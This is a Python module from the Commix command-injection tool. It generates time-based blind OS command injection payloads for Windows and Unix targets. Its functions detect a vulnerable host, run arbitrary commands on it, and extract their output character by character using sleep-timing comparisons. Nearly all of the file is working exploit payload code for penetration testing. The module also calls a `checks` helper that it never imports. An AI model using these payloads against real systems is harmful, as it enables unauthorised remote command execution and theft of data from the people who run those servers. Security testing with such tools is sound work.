#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.thirdparty.six.moves import urllib as _urllib
from src.utils import settings

"""
The "time-based" injection technique on Blind OS Command Injection.
The available "time-based" payloads.
"""

"""
Time-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, output_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass
  else:
    if separator == ";" or separator == "%0a":
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                 )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "sleep 0 " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                 )
      
      # separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.SINGLE_WHITESPACE +
                 pipe + "tr -d '\\n' " + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    if separator == ";" or separator == "%0a":
      payload = (separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )

      # separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  payload = checks.payload_newline_fixation(payload)

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = cmd
    if settings.USE_BACKTICKS:
      cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    if separator == ";" or separator == "%0a":
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + separator +
                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                )

    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "sleep 0" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length $" + settings.RANDOM_VAR_GENERATOR + ")" + separator +
                 "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                 "sleep " + str(timesec)
                 )
      # separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " +str(output_length)+ " -ne " + settings.CMD_SUB_PREFIX + "echo -n \"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" +
                 pipe + "tr -d '\\n'  " + pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator == ";" or separator == "%0a":
      payload = (separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                 )

      # separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\") ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.payload_newline_fixation(payload)

"""
Get the execution output, of shell execution.
"""
def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    cmd_exec = cmd
    if settings.USE_BACKTICKS:
      cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    settings.USER_APPLIED_CMD = cmd
    if separator == ";" or separator == "%0a" :
      payload = (separator +
                # Grab the execution output.
                settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "\"" + separator +
                # Export char-by-char the execution output.
                settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(num_of_chars) + " 1" + settings.CMD_SUB_SUFFIX + separator +
                # Transform from Ascii to Decimal.
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX + separator +
                # Perform the time-based comparisons
                "if [ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
                # "then sleep 0" + separator +
                "then sleep " + str(timesec) + separator +
                "fi"
                )

    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "sleep 0 " + separator +
                # Grab the execution output.
                settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "\"" + separator +
                # Export char-by-char the execution output.
                settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(num_of_chars) + " 1" + settings.CMD_SUB_SUFFIX + separator +
                # Transform from Ascii to Decimal.
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX + separator +
                # Perform the time-based comparisons
                "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                "sleep " + str(timesec)
                )
      # separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + cmd + pipe + "tr -d '\\n'" +
                pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" +
                pipe + "head -1" + pipe + "awk '{print$2}'" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                "sleep " + str(timesec)
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )

    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    settings.USER_APPLIED_CMD = cmd
    if separator == ";" or separator == "%0a":
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )

    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )
      
      # separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )

    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  payload = checks.payload_newline_fixation(payload)

  return payload

"""
Get the execution output, of shell execution.
"""
def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )
    else:
      pass

  else:
    if separator == ";" or separator == "%0a":
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
                 "if [ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
                 # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                 )

    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 "sleep 0 " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
                 "[ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ] " + separator +
                 "sleep " + str(timesec)
                 )
      # separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne \"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\" ]" + separator +
                 "sleep " + str(timesec)
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass

  else:
    if separator == ";" or separator == "%0a":
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )

    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )

      # separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\") ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                 )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.payload_newline_fixation(payload)

# eof